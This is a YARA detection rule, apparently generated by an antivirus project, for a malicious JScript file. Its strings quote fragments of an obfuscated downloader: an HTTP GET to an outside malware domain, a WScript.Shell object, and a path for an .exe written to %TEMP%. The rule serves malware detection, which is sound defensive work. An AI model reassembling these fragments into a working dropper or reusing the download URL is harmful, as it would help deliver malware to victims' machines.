rule sig_20160401_e002611d33a3a93bbb9fca36fca03bb1 {
  meta:
    description = "datamaliciousorder - file 20160401_e002611d33a3a93bbb9fca36fca03bb1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bd8e6cf973500e2870a28b6f8df2c55d245db9d6056a8abb6b7fde5ed7069cf5"

  strings:
    $s1  = "JfJv[CloWu](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "function PwGyr(AdXgc, RbcNcj){QuJxh = QuJxh * 1; return AdXgc - RbcNcj;};" fullword ascii
    $s3  = "var LaKcu = function UoaVgj() {return WScript[CtSqo](\"WScript\"+\".Shell\");}(), EaxYqw = 11;" fullword ascii
    $s4  = "if (JfJv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TyTu(){return MkOx + \"\";};" fullword ascii
    $s6  = "function ZdDh() {return LaKcu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HIBDBDTHbg2eEHF9.ex\" + \"e\";};" fullword ascii
    $s7  = "function CdPc() {return ((QrHa == true) && (QrHa == PdbPlp)) ? 1 : QuJxh;};" fullword ascii
    $s8  = "function TaSk(WmAkt) {var BdWd = (1, 2, 3, 4, 5, WmAkt); return BdWd;};" fullword ascii
    $s9  = "var PdbPlp = false;" fullword ascii
    $s10 = "var MtaTi = new this[\"Date\"]();" fullword ascii
    $s11 = "var FsxXxm = false;" fullword ascii
    $s12 = "PdbPlp = true; " fullword ascii
    $s13 = "VoYs[\"type\"] = TaSk(1);" fullword ascii
    $s14 = "BhGyn[\"position\"] = TaSk(QuJxh);" fullword ascii
    $s15 = "function HlIeo(){return CtSqo;};" fullword ascii
    $s16 = "var QrHa = false;" fullword ascii
    $s17 = "function GbNki(){return 23;};" fullword ascii
    $s18 = "return PwGyr(WatEf, CimKzi);" fullword ascii
    $s19 = "function ZiBj()" fullword ascii
    $s20 = "}while (OrfRq);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}